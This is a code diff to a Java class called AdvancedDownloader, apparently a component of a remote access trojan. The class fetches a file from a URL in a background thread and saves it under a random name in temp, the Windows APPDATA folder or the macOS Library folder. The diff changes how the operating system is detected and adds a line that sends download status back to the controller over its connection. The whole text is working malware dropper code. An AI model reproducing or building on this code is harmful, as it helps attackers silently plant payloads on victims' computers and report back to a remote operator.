@@ -9,6 +9,8 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.Random;
 
+import com.redpois0n.oslib.OperatingSystem;
+
 
 public class AdvancedDownloader extends Thread {
 
@@ -42,17 +44,14 @@ public class AdvancedDownloader extends Thread {
 				}
 			} else if (url.lastIndexOf(".") + 3 >= url.length()) {
 				fileName = (new Random().nextInt()) + url.substring(url.lastIndexOf(".") + 1, url.length());
-			} else {
-				fileName = (new Random().nextInt()) + ".exe";
 			}
 
 			if (drop.equals("temp/documents (unix)")) {
 				file = new File(System.getProperty("java.io.tmpdir"), fileName);
 			} else if (drop.equals("appdata")) {
-				String os = System.getProperty("os.name").toLowerCase();
-				if (os.contains("win")) {
-					file = new File(System.getenv("APPDATA") + File.separator + fileName);
-				} else if (os.contains("mac")) {
+				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+					file = new File(System.getenv("APPDATA") + "\\" + fileName);
+				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 					file = new File(System.getProperty("user.home") + "/Library/" + fileName);
 				} else {
 					file = new File(System.getProperty("java.io.tmpdir"), fileName);
@@ -79,10 +78,9 @@ public class AdvancedDownloader extends Thread {
 			}
 
 		} catch (Exception ex) {
-			/*Connection.writeLine("URLSTAT");
-			Connection.writeLine(url);
-			Connection.writeLine(ex.getMessage());*/ // TODO
 			ex.printStackTrace();
+			
+			con.addToSendQueue(new Packet27URLStatus(url, "Error: " + ex.getMessage()));
 		}
 	}
 
